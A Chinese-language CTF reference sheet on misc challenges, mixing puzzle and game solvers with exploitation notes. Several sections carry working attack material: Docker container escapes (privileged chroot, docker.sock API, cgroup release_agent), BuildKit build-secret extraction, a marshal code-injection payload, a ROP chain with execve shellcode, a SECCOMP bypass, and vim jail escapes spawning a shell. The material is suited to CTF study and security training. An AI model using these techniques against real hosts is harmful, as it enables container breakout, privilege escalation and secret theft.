# CTF Misc - 游戏、虚拟机与约束求解（第3部分）

## 目录
- [memfd_create 打包二进制](#memfd_create-packed-binaries)
- [多阶段交互式密码游戏（EHAX 2026）](#multi-phase-interactive-crypto-game-ehax-2026)
- [模拟器 ROM 切换状态保存（BSidesSF 2026）](#emulator-rom-switching-state-preservation-bsidessf-2026)
- [Python Marshal 代码注入（iCTF 2013）](#python-marshal-code-injection-ictf-2013)
- [Benford 定律频率分布绕过（iCTF 2013）](#benfords-law-frequency-distribution-bypass-ictf-2013)
- [并行连接 Oracle 中继（Hack.lu 2015）](#parallel-connection-oracle-relay-hacklu-2015)
- [Nonogram 解题器到二维码流水线（SECCON 2015）](#nonogram-solver-to-qr-code-pipeline-seccon-2015)
- [100 囚犯问题 / 循环跟踪策略（Sharif CTF 2016）](#100-prisoners-problem--cycle-following-strategy-sharif-ctf-2016)
- [通过 Emoji 标识符和 Gadget 嵌入逃离 C 代码沙箱（Midnight Flag 2026）](#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026)
  - [步骤 1：从 emoji 构造整数](#step-1-integer-construction-from-emoji)
  - [步骤 2：通过 add eax 常数编码嵌入 gadget](#step-2-embed-gadgets-via-add-eax-constant-encoding)
  - [步骤 3：基于栈的 ROP，使用 push rsp; pop rsi; syscall](#step-3-stack-based-rop-via-push-rsp-pop-rsi-syscall)
  - [步骤 4：ROP 链实现 mprotect + read + shellcode](#step-4-rop-chain-to-mprotect--read--shellcode)
  - [步骤 5：带 glob 的 shellcode 用于未知 flag 路径](#step-5-shellcode-with-glob-for-unknown-flag-path)
- [BuildKit 守护进程利用获取构建密钥（BSidesSF 2026）](#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026)
- [Docker 容器逃逸技术](#docker-container-escape-techniques)
  - [特权容器突破](#privileged-container-breakout)
  - [Docker Socket 逃逸](#docker-socket-escape)
  - [基于能力的逃逸（CAP_SYS_ADMIN）](#capability-based-escape-cap_sys_admin)
  - [容器信息泄露](#container-information-leakage)
- [15 拼图可解性作为位编码器（SharifCTF 8）](#15-puzzle-solvability-as-bit-encoder-sharifctf-8)
- [Levenshtein 距离 Oracle 攻击（SunshineCTF 2016）](#levenshtein-distance-oracle-attack-sunshinectf-2016)
- [通过高位文件描述符技巧绕过 SECCOMP（33C3 CTF 2016）](#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016)
- [通过自定义 vimrc 和 Python3 执行逃离 rvim 沙箱（BKP 2017）](#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017)
- [通过 CTRL-W F 和 netrw 文件浏览器逃离受限 vim（TokyoWesterns 2018）](#restricted-vim-escape-via-ctrl-w-f-and-netrw-file-browser-tokyowesterns-2018)
- [通过类型强制绕过自定义语言污点分析（PlaidCTF 2018）](#taint-analysis-bypass-in-custom-language-via-type-coercion-plaidctf-2018)
- [碎纸文件像素边缘重组（Nuit du Hack CTF 2018）](#shredded-document-pixel-edge-reassembly-under-time-pressure-nuit-du-hack-ctf-2018)
- [参考文献](#references)

---

## memfd_create 打包二进制

```python
from Crypto.Cipher import ARC4
cipher = ARC4.new(b"key")
decrypted = cipher.decrypt(encrypted_data)
open("dumped", "wb").write(decrypted)
```

**关键洞察：** 使用 `memfd_create` 的二进制文件完全在内存中执行 payload，不会在磁盘留下文件。通过 hook `memfd_create` 或转储 `/proc/pid/fd/` 条目，在 `fexecve` 之前截获解密后的 payload，然后正常分析转储的二进制文件。

---
## Multi-Phase Interactive Crypto Game (EHAX 2026)

**模式（The Architect's Gambit）：** 服务器提供一个多阶段挑战，结合了密码学、博弈论和承诺-揭示协议。

**阶段结构：**
1. **阶段 1（AES-ECB 解密）：** 使用提供的密钥解密堆值。从游戏状态中确定胜者。
2. **阶段 2（基于派生密钥的 AES-CBC）：** 密钥通过对阶段 1 结果的 SHA-256 链派生。解密以获取游戏参数。
3. **阶段 3（交互式游戏玩法）：** 在承诺-揭示协议约束下，进行组合游戏的最优移动。

**承诺-揭示（HMAC 绑定）：**
```python
import hmac, hashlib

def compute_binding_token(session_nonce, answer):
    """服务器在揭示结果前验证你的答案承诺。"""
    message = f"answer:{answer}".encode()
    return hmac.new(session_nonce, message, hashlib.sha256).hexdigest()

# 流程：先发送 token，然后服务器揭示状态，最后发送答案
# 服务器检查：HMAC(nonce, answer) == 你的 token
# 防止在看到状态后更改答案
```

**用于游戏耗尽计算的 GF(2^8) 算术：**
```python
# Galois 域 GF(256) 用于某些游戏机制（Nim 变体）
# Nim 值的 XOR 决定胜负位置

def gf256_mul(a, b, poly=0x11b):
    """使用不可约多项式在 GF(2^8) 中乘法。"""
    result = 0
    while b:
        if b & 1:
            result ^= a
        a <<= 1
        if a & 0x100:
            a ^= poly
        b >>= 1
    return result

# Nim 游戏的 GF(256) 移动规则：
# 当 Nim 值（堆 Grundy 值的 XOR）为 0 时，位置为必败
# 最优移动：找到移除石子后使 XOR 和为 0 的堆
```

**游戏树记忆化（C++ 提升性能）：**
```python
# Python 对于大状态空间太慢 — 使用 C++ 和记忆化
# 状态压缩：将所有堆大小编码为单个整数
# 缓存：unordered_map<state_t, bool> 用于胜负判定

# 小型游戏的 Python 备选方案：
from functools import lru_cache

@lru_cache(maxsize=None)
def is_winning(state):
    """返回当前玩家是否能强制获胜。"""
    state = tuple(sorted(state))  # 归一化以便缓存
    for move in generate_moves(state):
        next_state = apply_move(state, move)
        if not is_winning(next_state):
            return True  # 找到使对手处于必败位置的移动
    return False  # 所有移动都导致对手获胜
```

**关键洞见：**
- 多阶段挑战需按顺序解决每个阶段 — 每阶段输出作为下一阶段输入
- HMAC 承诺-揭示防止猜测；必须计算正确答案
- GF(256) Nim 变体需用 Sprague-Grundy 理论，非暴力破解
- 当 Python 递归过慢（>10秒）时，重写游戏求解器为 C++，使用状态压缩和记忆化

---

## Emulator ROM-Switching State Preservation (BSidesSF 2026)

**模式（wromwarp）：** 在模拟器调试器中，`/load` 命令可能只替换 ROM 程序，而保留 CPU 状态（寄存器、RAM、程序计数器）。通过在特定 PC 值切换 ROM，可以使用不同程序的指令执行任意指令序列。

**关键洞见：** 当通过模拟器调试接口加载新 ROM 时，CPU 状态（寄存器、RAM、PC）保持不变。仅程序内存（ROM）被替换。这意味着：
- 如果 ROM A 在某些地址将秘密数据加载到 RAM
- 且 ROM B 在 ROM A 执行暂停的相同 PC 处有 `display` 指令
- 在该点加载 ROM B 会导致 CPU 使用 ROM A 的数据（秘密）执行 ROM B 的指令（display）

**利用流程：**
```text
1. 加载 ROM_A（包含初始化并将秘密加载到 RAM）
2. 单步执行 ROM_A，直到秘密数据在 RAM 中
3. 记录当前 PC 值
4. /load ROM_B（PC、寄存器、RAM 全部保留）
5. ROM_B 在当前 PC 处有“显示内存”指令
6. 单步 → 执行 ROM_B 的显示指令，显示 ROM_A 的秘密数据
```

**实际示例：**
```python
from pwn import *

p = remote('target', port)

# 加载初始化秘密数据的第一个 ROM
p.sendlineafter('> ', '/load rom_init.bin')
# 单步执行直到秘密在内存中（通过分析确定）
for _ in range(42):
    p.sendlineafter('> ', '/step')

# 切换到在当前 PC 显示内存的 ROM
p.sendlineafter('> ', '/load rom_display.bin')
p.sendlineafter('> ', '/step')

# 读取泄露的秘密
flag = p.recvline().strip()
print(f"Flag: {flag}")
```

**识别时机：**
- 模拟器/调试器挑战，带有 `/load`、`/step`、`/run`、`/dump` 命令
- 提供多个 ROM 文件
- 一个 ROM 初始化受保护内存，另一个具备显示/输出功能
- 挑战提及“ROM 切换”、“热插拔”或“状态保留”

**关键教训：**
- 模拟器调试接口在加载 ROM 时不重置 CPU 状态，导致状态混合漏洞
- 通过在正确 PC 值加载不同程序，组合不同程序的指令
- 受保护内存（在某 ROM 上只读）通过另一个 ROM 的显示指令变得可访问

**参考资料：** BSidesSF 2026 “wromwarp”

---
## Python Marshal 代码注入 (iCTF 2013)

**模式：** 服务器反序列化 base64 编码的 `marshal` 数据，并将其作为 Python 函数执行。通过序列化的函数代码对象注入任意代码。

```python
import marshal, types, base64

# 构造通过 socket 外泄数据的 payload 函数
payload = lambda sock: sock.send(globals()['flag'].encode())

# 序列化函数的代码对象
serialized = base64.b64encode(marshal.dumps(payload.__code__)).decode()

# 服务器端执行模式：
# func = types.FunctionType(marshal.loads(base64.b64decode(data)), globals())
# func(client_socket)
```

**关键洞察：** `marshal.loads()` 和 `pickle.loads()` 一样危险——它反序列化任意 Python 代码对象。与 pickle 不同的是，marshal 很少被沙箱限制。注入的函数可以访问服务器的 `globals()`，从而通过 socket 连接泄露 flag。

---

## Benford 定律频率分布绕过 (iCTF 2013)

**模式：** 服务器验证输入数字频率是否符合 Benford 定律分布（±5% 容差）。构造符合正确数字分布的输入以通过校验。

```python
import random

# Benford 定律：首位数字 d (1-9) 的概率 P(d) = log10(1 + 1/d)
benford = {d: round(100 * (1 + 1/d) / sum(1/i for i in range(1,10))) for d in range(1,10)}
# 近似：1→30%，2→18%，3→12%，4→10%，5→8%，6→7%，7→6%，8→5%，9→5%

def generate_benford_compliant(length=1000):
    digits = []
    for d, pct in benford.items():
        digits.extend([str(d)] * int(length * pct / 100))
    random.shuffle(digits)
    return ''.join(digits[:length])
```

**关键洞察：** Benford 定律描述自然数据集中首位数字的频率分布。如果服务验证数字分布，应生成符合分布的输入而非随机数字。容差通常为±5%，因此近似百分比即可。

---

## 并行连接 Oracle 中继 (Hack.lu 2015)

当服务器生成确定性序列并提供反馈时，利用多个并发连接共享答案：

1. 以相同时间（相同 PRNG 种子）打开 N+1 个连接
2. 每轮牺牲一个连接以探测正确答案
3. 通过同步将发现的答案中继给剩余连接

```python
import threading

NUM_CONNECTIONS = 101
barriers = [threading.Barrier(NUM_CONNECTIONS - i) for i in range(100)]
correct_answers = [None] * 100

def worker(index, sock):
    for round_num in range(100):
        barriers[round_num].wait()  # 同步所有线程

        if index == round_num:
            # 此线程牺牲自己进行探测
            for guess in range(100):
                sock.send(str(guess).encode())
                response = sock.recv(1024)
                if b'correct' in response:
                    correct_answers[round_num] = guess
                    break
        else:
            # 等待 oracle 线程找到答案
            barriers[round_num].wait()
            sock.send(str(correct_answers[round_num]).encode())

threads = [threading.Thread(target=worker, args=(i, connections[i])) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
```

**关键洞察：** 适用于多个连接共享状态（相同连接时间导致相同 PRNG 种子）的服务。牺牲模式确保至少有一个连接能通过所有轮次。

---

## Nonogram 解题到 QR 码流水线 (SECCON 2015)

自动化解决生成 QR 码的 nonogram 拼图：

1. **解析约束**：从网页界面（使用 BeautifulSoup 解析 HTML 表格）
2. **解 nonogram**：使用外部解算器或约束传播
3. **渲染成图像**并解码 QR

```python
from PIL import Image
import subprocess, qrtools

# 从 HTML 解析行/列约束
rows = parse_constraints(html, 'rows')   # [[3,1], [2,2], ...]
cols = parse_constraints(html, 'cols')

# 输入给 nonogram 解算器（如 nonogram-0.9）
solver_input = format_for_solver(rows, cols)
result = subprocess.run(['./nonogram'], input=solver_input, capture_output=True)

# 将文本网格转换为 QR 图像
grid = parse_solver_output(result.stdout)
cell_size = 10
img = Image.new('RGB', (len(grid[0]) * cell_size, len(grid) * cell_size), 'white')
# 在 grid == '#' 处绘制黑色方格

# 解码 QR
qr = qrtools.QR()
qr.decode('qrcode.png')
answer = qr.data
```

**关键洞察：** Nonogram 解算器通常作为命令行工具提供。关键挑战是解析网页界面并将输出转换为有效的 QR 图像。为保证解码可靠，需在 QR 周围添加安静区（白色边框）。

---
## 100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)

经典的100囚犯问题在CTF挑战中以“不可思议”的概率游戏形式出现：

- N名囚犯每人打开N/2个盒子寻找自己的编号
- 全部囚犯都必须找到自己的编号，团队才算获胜
- 最优策略：沿置换循环查找（成功率约31%）

```python
def solve_prisoners(boxes):
    """从自己的编号开始沿循环查找"""
    N = len(boxes)
    results = []
    for prisoner in range(N):
        current = prisoner
        found = False
        for _ in range(N // 2):
            if boxes[current] == prisoner:
                found = True
                break
            current = boxes[current]  # 沿循环继续查找
        results.append(found)
    return all(results)
```

**关键洞察：**随机策略成功概率为 (1/2)^N ≈ 0。循环跟踪策略在N较大时成功概率为 1 - ln(2) ≈ 0.3069。游戏失败的唯一情况是存在长度超过N/2的循环。如果盒子排列已知，可以预先检查循环长度。

---

## C代码沙箱逃逸：通过Emoji标识符和gadget嵌入 (Midnight Flag 2026)

逃离一个禁止所有字母数字字符、空白符和大多数运算符的C代码沙箱，利用GCC对Unicode标识符的支持，并将机器码gadget嵌入算术常量中。

**限制条件：**只允许使用 `(){}[];,=.+*%@#~` 和 emoji。禁止字母、数字、空白、引号以及 `?&!|$<>^:/-`。

### 第1步：用emoji构造整数

GCC允许emoji作为标识符。表达式 `(😃==😃)` 是编译时常量 `1`。通过加法和乘法构造任意整数：

```c
// 构造15：3 * (2*2 + 1)
((😃==😃)+(😃==😃)+(😃==😃))*(((😃==😃)+(😃==😃))*((😃==😃)+(😃==😃))+(😃==😃))
```

### 第2步：通过add eax常量编码嵌入gadget

在 `-O0` 优化级别下，`var = var + CONSTANT` 编译为 `05 XX XX XX XX`（add eax, imm32）。跳转到偏移+1处即可将常量字节作为指令执行：

| 目标字节 | 指令 | 常量（十进制） |
|---|---|---|
| `0f 05 c3` | syscall; ret | 12780815 |
| `58 c3` | pop rax; ret | 50008 |
| `5f c3` | pop rdi; ret | 50015 |
| `5a c3` | pop rdx; ret | 50010 |
| `5e c3` | pop rsi; ret | 50014 |
| `54 5e 0f 05` | push rsp; pop rsi; syscall | 84893268 |

```c
// 每个gadget函数嵌入一条指令序列：
😇(){😼=😼+<12780815_as_emoji_expr>;}  // syscall; ret 在 😇+15 处
```

### 第3步：基于栈的ROP，通过 push rsp; pop rsi; syscall

调用 `push rsp; pop rsi; syscall` gadget，使用 sys_read 参数将ROP链直接写入栈上的返回地址：

```c
// (gadget_func + 15)(stdin=0, buf=ignored_rsp_used, len=4096)
😀(){(😃+<15_expr>)(😷,😸,<4096_expr>);}
```

`push rsp` 捕获返回地址位置，`pop rsi` 将其设为读取缓冲区，随后 `syscall` 读取攻击者输入到栈上。

### 第4步：ROP链实现mprotect + read + shellcode

```python
from pwn import *

rop = flat([
    0xdeadbeef,      # 被 pop rbp 消耗
    POP_RAX, 10,     # sys_mprotect
    POP_RDI, 0x404000,
    POP_RSI, 0x2000,
    POP_RDX, 7,      # PROT_READ|WRITE|EXEC
    SYSCALL_RET,
    POP_RAX, 0,      # sys_read
    POP_RDI, 0,      # stdin
    POP_RSI, 0x404020,
    POP_RDX, 0x200,
    SYSCALL_RET,
    0x404020,         # 跳转到shellcode
])
```

### 第5步：带glob的shellcode，用于未知flag路径

```python
# execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"], NULL)
shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"]))
```

**关键洞察：**GCC的 `-static -nostartfiles -nostdlib` 生成最小化二进制，地址确定（无ASLR）。每个emoji函数地址可预测（0x401000, 0x40101c, ...）。`add eax, imm32` 编码是关键原语——任何4字节gadget序列都能作为算术常量嵌入有效C表达式。

**注意编译参数：**`-nostartfiles -nostdlib -static` 表示无libc、无CRT、布局确定——适合地址硬编码利用。

---
## BuildKit 守护进程利用以获取构建秘密（BSidesSF 2026）

**模式（builds-as-a-service）：** 挑战接受一个 Dockerfile 并进行构建。构建环境使用带有 `--mount=type=secret,id=flag` 的 Docker BuildKit 在构建过程中注入秘密。暴露的 BuildKit 守护进程（tcp://127.0.0.1:1234）允许提交嵌套构建请求，从而挂载并读取秘密。

**攻击（两阶段 Dockerfile）：**

阶段 1 — 提交一个安装 `buildctl` 并触发嵌套构建的 Dockerfile：
```dockerfile
FROM moby/buildkit:v0.17.1-rootless
COPY Dockerfile.exploit /tmp/Dockerfile
RUN <<'EOF'
buildctl --addr tcp://127.0.0.1:1234 build \
  --frontend dockerfile.v0 \
  --local context=/tmp --local dockerfile=/tmp \
  --opt filename=Dockerfile.exploit \
  --progress plain 2>&1; false
EOF
```

阶段 2 — 嵌套的 Dockerfile (`Dockerfile.exploit`) 挂载并读取秘密：
```dockerfile
FROM alpine
RUN --mount=type=secret,id=flag cat /run/secrets/flag; false
```

**为何使用 `; false`：** 强制非零退出码，导致 BuildKit 将完整构建输出（包括 flag）转储到 stderr。否则，成功构建可能会抑制中间输出。

**关键洞察：** BuildKit 在 localhost 上的 gRPC API 默认不进行身份验证。任何运行在相同网络命名空间的容器都可以提交构建请求。`--mount=type=secret` 机制设计用于构建时秘密，但依赖守护进程不可访问——如果守护进程暴露，任何构建都可以请求任何秘密。

**替代方法：** 如果没有 `buildctl`，可直接使用 BuildKit gRPC API：
```python
# buildctl du / buildctl debug workers  — 枚举可用工作节点
# buildctl build --progress=plain — 跟踪构建输出
```

**识别时机：** 挑战提供 Dockerfile 上传/构建服务。查找 BuildKit 特性（`--mount=type=secret`、`BUILDKIT_INLINE_CACHE`、`# syntax=` 指令）。检查构建守护进程是否可从构建的容器内访问。

**现实意义：** 这反映了实际 CI/CD 供应链攻击，其中构建系统向不受信任的构建步骤暴露秘密。GitHub Actions、GitLab CI 和 Jenkins 都有类似的秘密注入机制。

**参考资料：** BSidesSF 2026 “builds-as-a-service”

---

## Docker 容器逃逸技术

### 特权容器突破

使用 `--privileged` 启动的容器拥有所有 Linux 能力和对主机设备的访问权限。挂载主机文件系统并 chroot：

```bash
# 列出主机磁盘
fdisk -l
# 挂载主机根文件系统
mkdir /mnt/host && mount /dev/sda1 /mnt/host
# chroot 到主机
chroot /mnt/host /bin/bash
# 或通过 nsenter（需要主机上的 PID 1）
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### Docker Socket 逃逸

如果容器内挂载了 `/var/run/docker.sock`，可创建一个新的特权容器并挂载主机根目录：

```bash
# 检查 socket
ls -la /var/run/docker.sock
# 逃逸：创建特权容器并挂载主机根目录
docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash
# 如果没有 docker CLI，可通过 API：
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
```

### 基于能力的逃逸（CAP_SYS_ADMIN）

拥有 `CAP_SYS_ADMIN` 权限时，利用 cgroup 的 release_agent 实现主机命令执行：

```bash
# 创建 cgroup，设置 release_agent 为主机命令
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'cat /flag > /tmp/cgrp/x/flag' >> /cmd && chmod +x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs  # 触发 release_agent
```
### 容器信息泄露

即使没有逃逸，容器也会泄露主机信息：
- `/proc/self/cgroup` —— 容器 ID
- `/proc/mounts` —— overlayfs 的 `upperdir` 显示主机路径
- `/sys/kernel/slab/*/cgroup/` —— 其他容器 ID（cgroup 调试信息）
- `/proc/1/environ` —— 容器启动时的环境变量

**关键洞察：** 首先检查 `--privileged` 标志、挂载的 socket（如 `docker.sock`）和能力（`capsh --print`）。Privileged = 立即逃逸。Socket = 创建新的特权容器。CAP_SYS_ADMIN = cgroup 的 release_agent。没有这些时，重点关注信息泄露和应用层逃逸。

---

## 15-Puzzle 可解性作为比特编码（SharifCTF 8）

128 个 15-puzzle 编码了 128 位 flag。每个位为 1 表示该拼图可解，0 表示不可解：

```python
def is_solvable(grid):
    # 计算逆序数（a > b 且 a 出现在 b 之前的对数）
    flat = [x for row in grid for x in row if x != 0]
    inversions = sum(1 for i in range(len(flat))
                     for j in range(i+1, len(flat)) if flat[i] > flat[j])
    # 对于 4x4：当逆序数加上空白行距底部的行数为偶数时可解
    blank_row = next(i for i, row in enumerate(grid) if 0 in row)
    blank_from_bottom = len(grid) - 1 - blank_row
    return (inversions + blank_from_bottom) % 2 == 0

flag_bits = ''.join('1' if is_solvable(puzzle) else '0' for puzzle in puzzles)
flag = bytes(int(flag_bits[i:i+8], 2) for i in range(0, len(flag_bits), 8))
```

**关键洞察：** 15-puzzle 有不变量：所有排列中恰好一半是可解的。拼图的可解性取决于逆序数的奇偶性加上空白块距底部的行数。这为每个拼图提供了自然的 1-bit 编码。当挑战提供大量拼图实例且无明显目标时，检查可解性是否编码了二进制数据。拼图数量是 8 的倍数强烈暗示了比特编码。

---

## 通过类型强制绕过自定义语言中的污点分析（PlaidCTF 2018）

**模式：** 在带有保密/污点系统的自定义 ML 类语言中，if 表达式的保密性取决于返回类型，而非条件。将有副作用的代码包装在函数中，强制转换为私有类型，并使用 if 语句根据私有 flag 位选择虚假或泄露函数。纯度检查器不分析函数内部。

```ml
(* pupper 变体：if 条件的保密性不传播到返回值 *)
let leaked = ref 0 in
let test = fn (bit : int) =>
  if !secret < bit then ()
  else (secret := !secret - bit; leaked := !leaked + bit)
in
test 128; test 64; test 32; test 16; test 8; test 4; test 2; test 1;
!leaked  (* 公开的 int，泄露私有字节 *)

(* doggo 变体：函数强制转换隐藏副作用 *)
let ignore = (fn (bit : int) => () :> private unit) :> private (int -> private unit) in
let incr = (fn (bit : int) => (leaked := !leaked + bit) :> private unit)
           :> private (int -> private unit) in
(if !secret < bit then ignore else incr) bit
(* if 返回私有函数类型，但选中的函数修改了公开的 ref *)
```

**关键洞察：** 信息流类型系统通常在表达式层面检查保密标签，而非数据流层面。如果返回类型匹配但副作用不同，类型检查器会通过，而私有数据通过公开的可变引用泄露。两种常见绕过： (1) if 条件的保密性不传播到分支，(2) 函数类型强制转换隐藏可变副作用。

---

## 在时间压力下通过像素边缘重组碎纸文档（Nuit du Hack CTF 2018）

**模式：** 100 条碎纸条必须在 10 秒内重组。通过标记位置检测方向，使用像素暗度位掩码计算边缘相似度，贪心地通过最小化相邻边缘的 XOR/汉明距离放置碎条，然后 OCR 识别。

```python
from PIL import Image
import pytesseract

class Strip:
    def __init__(self, img):
        self.img = img
        w, h = img.size
        self.trace_first = 0  # 左边缘位掩码
        self.trace_last = 0   # 右边缘位掩码
        for y in range(h):
            # 暗像素（和 < 765）= 在位置 y 置位
            self.trace_first |= (1 if sum(img.getpixel((0, y))) < 765 else 0) << y
            self.trace_last |= (1 if sum(img.getpixel((w-1, y))) < 765 else 0) << y

def edge_distance(strip_a, strip_b):
    """计算 A 的右边缘与 B 的左边缘的汉明距离"""
    return bin(strip_a.trace_last ^ strip_b.trace_first).count('1')

# 贪心放置：对每个位置，选择边缘距离最小的碎条
```

**关键洞察：** 碎纸条在切割边缘处共享像素。将每条碎纸的左右边缘编码为二进制位掩码（暗=1，亮=0），然后用 XOR + 计数（汉明距离）找到最佳匹配的相邻碎条。用边缘距离度量的贪心放置能在毫秒级重组文档。

---
## 参考资料
- EHAX 2026 "The Architect's Gambit"：多阶段 AES + HMAC + GF(256) Nim
- BSidesSF 2026 "wromwarp"：模拟器 ROM 切换状态保存
- iCTF 2013：Python marshal 代码注入，Benford 定律绕过
- Hack.lu 2015：并行连接 oracle 中继
- SECCON 2015：Nonogram 解题器到二维码流水线
- Sharif CTF 2016：100 囚犯问题 / 循环跟踪策略
- SharifCTF 8：15 拼图可解性作为位编码器
- Midnight Flag 2026：通过表情符号标识符逃逸 C 代码沙箱
- BSidesSF 2026 "builds-as-a-service"：BuildKit 守护进程构建秘密利用
- SunshineCTF 2016：Levenshtein 距离 oracle 攻击
- PlaidCTF 2018：通过自定义语言中的类型强制绕过污点分析
- Nuit du Hack CTF 2018：碎纸文件像素边缘重组

---

## Levenshtein 距离 Oracle 攻击（SunshineCTF 2016）

Oracle 返回猜测与秘密之间的编辑距离。攻击策略：

1. **确定长度：** 提交空字符串，距离即为秘密长度
2. **识别存在字符：** 提交单一重复字符（如 "aaaa..."），距离 = 长度 - 该字符出现次数
3. **定位位置：** 二分查找 —— 将一半位置填充已知存在字符，另一半填充已知不存在字符，通过距离变化缩小范围

```python
# 确定哪些字符存在
for c in string.printable:
    d = oracle(c * length)
    count = length - d  # c 出现的次数
    if count > 0:
        chars[c] = count
```

**关键洞察：** 编辑距离作为侧信道。通过 Levenshtein 反馈的二分查找可在 O(n log n) 查询内定位字符位置。

---

## 通过高位文件描述符技巧绕过 SECCOMP（33C3 CTF 2016）

**模式（tea）：** SECCOMP 过滤器阻止 `close(fd)` 对 fd 值为 0、1 和 2（stdin/stdout/stderr）的调用。绕过方法：`close(0x8000000000000002)` 通过了 64 位比较（不等于 2），但内核将 fd 参数截断为 32 位，实际关闭了 fd 2。这样释放了 fd 2，下一次 `open()` 返回 fd 2。现在 `write(2, ...)` 写入新打开的文件而非 stderr，且 SECCOMP 允许写入，因为 fd 2 从未被显式阻止写操作。

```c
// SECCOMP 规则：拒绝 close(fd) 当 fd == 0 || fd == 1 || fd == 2
// 绕过：带高位的 close
close(0x8000000000000002);  // SECCOMP 看到 fd != 2（64 位比较）-> 允许
// 内核：fd = (int)(0x8000000000000002) = 2 -> 关闭 fd 2

open("/proc/self/mem", O_WRONLY);  // 返回 fd 2（最低可用）
 // 通过 fd 2 写入 /proc/self/mem 修改父进程内存
```

**关键洞察：** SECCOMP BPF 作用于原始 64 位系统调用参数，但内核的 `close()` 实现将其转换为 32 位整数。设置第 63 位改变了 64 位值，同时保持 32 位截断结果不变。SECCOMP 过滤器与内核系统调用处理器之间的类型/宽度不匹配是通用绕过模式 —— 检查任何被过滤系统调用的参数宽度。

---

## 通过带 Python3 执行的自定义 vimrc 逃逸 rvim 沙箱（BKP 2017）

**模式（vimjail）：** `rvim`（受限 vim）阻止 `:!`、`:shell` 等命令执行。但 `rvim -u custom_vimrc` 会加载用户指定的 vimrc 文件，该文件在限制完全生效前执行。如果通过 `sudo -u targetuser` 运行 `rvim`，vimrc 可以包含 `:python3 import os; os.system("cmd")` 以目标用户身份执行命令。

```bash
# 创建恶意 vimrc
cat > /tmp/evil_vimrc << 'EOF'
:python3 import os; os.system("/home/ctfuser/flagReader /.flag")
:q!
EOF

# 以目标用户身份使用自定义 vimrc 启动 rvim
sudo -u secretuser rvim -u /tmp/evil_vimrc /dev/null

# 另一种方式：进入 rvim 后交互式逃逸
:py3 import os; os.system("/bin/bash")
```

**关键洞察：** `rvim` 限制了 shell 命令（`:!cmd`），但 Python/Lua/Ruby 接口仍可用。`:python3` 或 `:py3` 命令执行任意 Python 代码，包括 `os.system()`。如果 vim 编译时启用了 `+python3`，则绕过所有 shell 限制。检查 `:version` 中是否有 `+python3`、`+lua` 或 `+ruby` —— 任何脚本接口都能逃逸沙箱。

---
## 通过 CTRL-W F 和 netrw 文件浏览器实现受限 vim 逃逸（TokyoWesterns 2018）

**模式：** 一个 vim 监狱环境屏蔽了 `:`、`Q`、`g` 以及脚本接口（`:py`、`:lua`、`:ruby`），但保留了普通模式下的导航命令。按下 `CTRL-W` 后接 `F`（大写）——vim 会分割一个新窗口并在光标所在路径打开 netrw 文件浏览器。通过 netrw 你可以像浏览目录一样导航，并且无需任何 `:` 命令即可读取任意文件。

```text
# 按键操作（无需 ex 命令）
:   — 被屏蔽
CTRL-W F    — 分割窗口，打开当前路径为 netrw 缓冲区
j / k       — 导航条目
Enter       — 读取选中文件到新缓冲区

# 如果你需要执行命令且 `:` 被禁用，将光标放在关键字
# 如 `ls` 上，按 K — vim 会打开该命令的手册页，
# 在手册页内你可以按 `!` 获得 shell 提示符。
```

**关键洞察：** vim 的受限模式仅限制基于 `:` 的 ex 命令；普通模式下的文件浏览器（`netrw`）、手册页查看（`K`）和帮助（`<C-w>gF`）接口依然完全开放。任何通过 `:set modifiable`、禁用 `:!` 或屏蔽命令行实现“受限 vim”的二进制程序，都可以轻易通过 CTRL-W F、K 或 gF 这三种普通模式操作绕过。在审计 vim 沙箱时，务必优先测试这三种普通模式原语。

**参考资料：** TokyoWesterns CTF 4th 2018 — vimshell，writeup 11269

---

参见 [games-and-vms-4.md](games-and-vms-4.md) 了解 2018 年相关新增内容（XSLT VM、JS 边缘案例、定时 oracle、OEIS、二维码重组、数学递推、验证码破解、esolang 多语言支持、bytebeat）。

另见：[games-and-vms.md](games-and-vms.md) 涉及 WASM 补丁、Roblox 地图文件逆向、PyInstaller 解包、marshal 分析、Python 环境 RCE、Z3 约束求解、K8s RBAC 绕过、浮点精度利用及自定义汇编语言沙箱逃逸。

另见：[games-and-vms-2.md](games-and-vms-2.md) 涉及 cookie 检查点暴力破解、Flask cookie 游戏状态泄露、WebSocket 游戏操控、服务器时间验证绕过、De Bruijn 序列、Brainfuck 插桩及 WASM 内存操作。
